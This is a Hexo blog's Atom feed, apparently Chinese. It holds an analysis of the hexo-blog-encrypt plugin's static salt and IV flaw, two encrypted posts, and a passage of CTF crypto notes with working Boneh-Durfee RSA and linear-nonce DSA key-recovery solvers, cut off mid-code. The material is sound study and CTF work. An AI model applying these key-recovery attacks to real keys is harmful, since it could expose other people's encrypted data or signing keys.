<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-28T10:43:34.691Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo_blog_encrypt_analysis</title>
    <link href="http://example.com/2024/01/28/hexo-blog-encrypt-analysis/"/>
    <id>http://example.com/2024/01/28/hexo-blog-encrypt-analysis/</id>
    <published>2024-01-28T08:05:31.000Z</published>
    <updated>2024-01-28T10:43:34.691Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。</p><h2 id="0x01-探索"><a href="#0x01-探索" class="headerlink" title="0x01 探索"></a>0x01 探索</h2><p>进入一个页面搜集信息。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281608581.png" alt="image-20240128160800457"></p><p>给请求过程下断点，开始调试：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281749426.png" alt="image-20240128174904306"></p><p>于是追踪到相关逻辑。接下来，进入分析工作。</p><blockquote><p>也可以从<a href="https://github.com/D0n9X1n/hexo-blog-encrypt%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%87%E5%85%A5%E3%80%82">https://github.com/D0n9X1n/hexo-blog-encrypt直接下载开发版本，这里从样本分析的角度切入。</a></p></blockquote><p><a href="https://github.com/AL3XEI709/Symmetric_Cryptography/blob/main/hbe.js">node_modules\hexo-blog-encrypt\lib\hbe.js</a> </p><h2 id="0x02-hbe-js"><a href="#0x02-hbe-js" class="headerlink" title="0x02 hbe.js"></a>0x02 hbe.js</h2><p>部署在hexo中的文件结构长这样，很美观：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281756666.png" alt="image-20240128175614617"></p><p>直奔<code>lib/hbe.js</code>:</p><p>文件开头：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281812675.png" alt="image-20240128181206595"></p><ol><li><p>严格模式声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>常量声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptoObj = <span class="variable language_">window</span>.<span class="property">crypto</span> || <span class="variable language_">window</span>.<span class="property">msCrypto</span>;</span><br><span class="line"><span class="keyword">const</span> storage = <span class="variable language_">window</span>.<span class="property">localStorage</span>;</span><br></pre></td></tr></table></figure><p><code>crytoObj</code> 用于访问浏览器的加密功能，<code>storage</code> 用于本地存储。</p></li><li><p>加密相关参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> storageName = <span class="string">&#x27;hexo-blog-encrypt:#&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span><br><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>storageName</code>: 存储加密数据的键名，基于当前页面的路径。 </p></li><li><p><code>keySalt</code> 和 <code>ivSalt</code>:  用于生成密钥和初始化向量的盐值，通过 <code>textToArray</code> 函数将文本转换为字节数组。</p></li></ul></li><li><p>解析 HTML 元素：</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mainElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hexo-blog-encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> wrongPassMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;wpm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> wrongHashMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;whm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> dataElement = mainElement.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="string">&#x27;hbeData&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> encryptedData = dataElement.<span class="property">innerText</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HmacDigist</span> = dataElement.<span class="property">dataset</span>[<span class="string">&#x27;hmacdigest&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>mainElement</code> 获取 id 为 <code>&#39;hexo-blog-encrypt&#39;</code> 的 HTML 元素。</li><li><code>wrongPassMessage</code> 和 <code>wrongHashMessage</code> 分别是用于显示密码错误和哈希校验失败的消息。</li><li><code>dataElement</code> 获取标签名为 <code>&#39;script&#39;</code> 且具有属性 <code>&#39;hbeData&#39;</code> 的元素。</li><li><code>encryptedData</code> 获取该元素的文本内容，即加密的数据。</li><li><code>HmacDigist</code> 获取加密数据的 HMAC 值。</li></ul><ol start="5"><li>辅助函数：</li></ol><ul><li><code>hexToArray(s)</code>：将十六进制字符串转换为字节数组。</li><li><code>textToArray(s)</code>：将文本转换为字节数组。</li><li><code>arrayBufferToHex(arrayBuffer)</code>：将 ArrayBuffer 转换为十六进制字符串。</li><li><code>getExecutableScript(oldElem)</code>：根据给定的元素创建可执行的脚本。</li><li><code>convertHTMLToElement(content)</code>：将 HTML 字符串转换为 HTML 元素。</li></ul><p><strong>密钥的生成与处理</strong>：</p><p>在代码中，使用了 <code>getKeyMaterial</code>、<code>getHmacKey</code>、<code>getDecryptKey</code> 和 <code>getIv</code> 函数来生成密钥和初始化向量。这些函数使用了PBKDF2 导出密钥材料，使用 HMAC 进行数据完整性校验，以及使用 AES-CBC 进行对称加密。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281825214.png" alt="image-20240128182522073"></p><p>加密过程中，使用 AES-CBC 加密算法对明文进行加密，并使用 HMAC 对加密后的密文进行签名，以确保数据的完整性。解密过程中，则先使用密码解密数据，然后校验 HMAC，最后返回解密后的明文。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826731.png" alt="image-20240128182613626"></p><p>在解密过程中，除了解密数据外，还需要对解密后的明文进行 HMAC 校验，以确保数据在传输过程中未被篡改。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826027.png" alt="image-20240128182653973"></p><h2 id="0x03-存在的问题"><a href="#0x03-存在的问题" class="headerlink" title="0x03 存在的问题"></a>0x03 存在的问题</h2><p>在分析源码时，我注意到一个细节：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PBKDF2算法使用的salt每次都必须是唯一的，AES算法的IV也每次都必须唯一，否则会存在字节翻转的安全问题。</p><p>不过，这个漏洞已经在去年九月提了pr, 目前官方最新的版本得到了修复。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281832925.png" alt="image-20240128183255815"></p><p>如图，将salt改成了一次一密，并在所有主题下加入了<code>keysalt</code>和<code>ivsalt</code>两个变量。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个插件的开发者有一定的密码学基础，在 hexo 渲染和展示时将原文用AES进行加密。但AES的具体操作上存在安全问题。</p><p>这是笔者第一次做js代码的分析工作，感觉动态调试的作用相当大。与之类似地，二进制可执行文件的逆向工程也常常可以通过动态调试获取到一些关键线索。同时对于解决博客加密的问题，以前一直考虑部署在服务端情况下如何实现（并用Go写了demo），js的强大功能令我耳目一新，用短短二百余行核心代码就实现了加密&#x2F;解密&#x2F;校验的核心功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;p&gt;hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。&lt;</summary>
      
    
    
    
    
    <category term="dev" scheme="http://example.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>An_Interesting_CTF_Challenge_0x1</title>
    <link href="http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/"/>
    <id>http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/</id>
    <published>2024-01-27T07:06:50.000Z</published>
    <updated>2024-01-29T03:41:29.784Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="914607b84c8d4dd7972619106a7ce0952666c15c578521cfd7888493f6bfa990"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Days_Without_Internet</title>
    <link href="http://example.com/2024/01/25/Days-Without-Internet/"/>
    <id>http://example.com/2024/01/25/Days-Without-Internet/</id>
    <published>2024-01-25T15:06:44.000Z</published>
    <updated>2024-01-28T01:14:42.364Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="416a0dae2e9e6f8acd97b1feec9f2f94269daa51cf2b3c6f23e6598a20bcb7e3">1ccc3afe3f8e8a6933effeff5e279474dabc45c9513abdcd9350e81646bf173688d54434ad4284470f65ba32ff04289492cf5a1e6795ece30ff512a23bb7e12f153a6c0a38e1b83bbb6babc028ca2ae5004d2140335cedff1612db32161b307824c18c5886b239d3968da245ef2b30130364e824578382a79696001fff110d66c0431f17690435b008aab19b40745abc1a30939aad8058ca1fb25c641fa4f848bf6a40312f3632f4c68c70913a84cf265f1e0bc9febee50b8414ef18b487f379f6a3cdfadb6089e1c411c3be136f65b448b8939f2ea1471d7e0afe5f9025a69eef955f7e749edc9f027c4b2eb38cabb17bde3d0d51e9c47b1e62ac97eb78ee7892c8485813b5b08de9d2e128b551a8f417e7ce35127c0298c9f4222279e6e9e2feb0ff567a704abaaf98629cb2d122c529c8f4e944bc247516d21d4d001f27c0612b009b37249509d41dffcca92031cb360cf3e5ad5bd60b3b58f6267441ef2720edfdecf201ed6119210f92a96bebda9267a269330a502fb49925607600138ff964257d8c0cab265eaa6d556b3b7c2d5a4706ecfde29690a3a8534ce8081ca659821115702d75f6aa660816b9005ebea61700120575799ad8ad87c99b9f5cefb698cd3cc95ad96e5e26d614b94194638a9e6225839ae567361bad6bba5bfe9dfc1aebc2e8bd671bc6684a6d33893af7ec1c0c0f588e180e3ccdf8ab495d59abd4cd3e6a2683f43c396cf8e77f559f6469879aa89bfbb79adf2e4c6fbe66db5307e782b99e7b913ca52096ee7bd1fe304905dbdb8a78b2003e0457f5d66dd9edbc6fc8a474924881333cc09f0c6f2463330759ee819fe384573e8da398f9ca33db9ce07e46f3dc0dce108c44485549ea4d89cf93a4c7fd6d6acb41ccba38dabf612290aa9557235d146731a52a0e241f19319bb9e6b9c0399cb166c473cf065c8c8ef5ae64909ad8bc92de99e89f42d0d72b0c1333f2062e487b3ef0fa151e48091656e01a3cb1fcf90dcae299305dfa71342b2aaed62c710e732f2acd1391ebe8851b753f170610133d466f18237f400c103826809f0cfb1d7588d614b9c15573615ae93bc81742ff3a9691fafb2b3d8799192185a33ebf071b7c0029083802da4c75fa4daf8fcf384bd1d1bd2abce1500b888489b4379d1e0669e9502e3dcc7b6894e2ada71a0f75b57eb1d4852712f7d0c53f92d3f3425e739ce298a55f4289f442a861600055fb8026693d283726b8ce5e1ca34108337566e8b28bf40a8e762f94e4ae43dc166147de258a1459541b15fa7c5f47e89123de9b3469e355745b245fe7857f8f34316563b5c6e20117ab1a2284329c530b0953de3a2819f6bdb114f9d0d3235ce497aeb9e4a7f422577b5225a92b273b98d62b9e58cbe343cabb0e47ebda675953089c32d641955396</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码阅读捏。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read.</summary>
    
    
    
    
    <category term="Other" scheme="http://example.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Notes</title>
    <link href="http://example.com/2024/01/22/CTF_Notes/"/>
    <id>http://example.com/2024/01/22/CTF_Notes/</id>
    <published>2024-01-22T14:09:34.000Z</published>
    <updated>2024-01-29T03:41:59.983Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-Not-Wiener"><a href="#0x01-Not-Wiener" class="headerlink" title="0x01 Not Wiener"></a>0x01 Not Wiener</h1><p>题目是变体的Boneh-Durfee attack, 需要在理解攻击原理后做调整。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = phi - getPrime(<span class="number">540</span>)  <span class="comment"># make sure it is big enough that wiener&#x27;s attack doesn&#x27;t work</span></span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于<code>d = phi - D </code> (令D为540位的随机素数)，比正常的多了个负号，故要做一些调整。</p><p>列出RSA等式：<br>$$<br>ed\equiv e(\phi(n)-D)\equiv-eD\equiv1\pmod\phi(n)<br>$$<br>去掉mod: $-eD&#x3D;1+k\phi(n)$</p><p>两边同时mod e: $-1\equiv k\phi(n)\equiv k(n-s)\pmod e$</p><p>其中$s&#x3D;p+q-1$，k是与D差不多大的负数。</p><p>考虑以下的二元多项式：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，所以(k, s)是f 的一个小根，可以用二元copper来解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="0x1-2-Boneh-Durfee的碎碎念"><a href="#0x1-2-Boneh-Durfee的碎碎念" class="headerlink" title="0x1.2 Boneh-Durfee的碎碎念"></a>0x1.2 Boneh-Durfee的碎碎念</h2><p>从上面的题也可以看出，Boneh-Durfee的核心就是Multivariate Coppersmith，也即多元Coppersmith。对于RSA公钥方程：<br>$$<br>ed\equiv1\pmod {\phi(n)}<br>$$<br>去掉取模符号：<br>$$<br>ed&#x3D;k\phi(n)+1<br>$$<br>同时模e:<br>$$<br>k\phi(n)+1&#x3D;0\pmod e<br>$$<br>令$s &#x3D; p+q-1$，则可以化成：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，其中(k, s)是f 的一个小根。</p><h1 id="0x02-Not-Wiener-Another"><a href="#0x02-Not-Wiener-Another" class="headerlink" title="0x02 Not Wiener(Another)"></a>0x02 Not Wiener(Another)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h1:%s r1:%s s1:%s&quot;</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h2:%s r2:%s s2:%s&quot;</span>%(h2,r2,s2))</span><br></pre></td></tr></table></figure><p>题目嵌套了标准Boneh-Durfee attack 和线性DSA攻击。</p><p>由cry()函数得之用的RSA加密的a, 同时d较小，用标准Boneh-Durfee attack就能求出a。</p><p>接下来是求线性关系的步骤。已知：<br>$$<br>(h_1+xr_1)k^{-1}\equiv s_1\pmod q<br>(h_2+xr_2)(ak+b)^{-1}\equiv s_2\pmod q<br>$$<br>一通相消得：<br>$$<br>(s_1k-h_1)r_2-(s_2(ak+b)-h_2)r1\equiv0\pmod q<br>$$<br>可以求k。得到k再带入一个式子求x，也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a =     <span class="comment">#Boneh-Durfee</span></span><br><span class="line">p= <span class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span 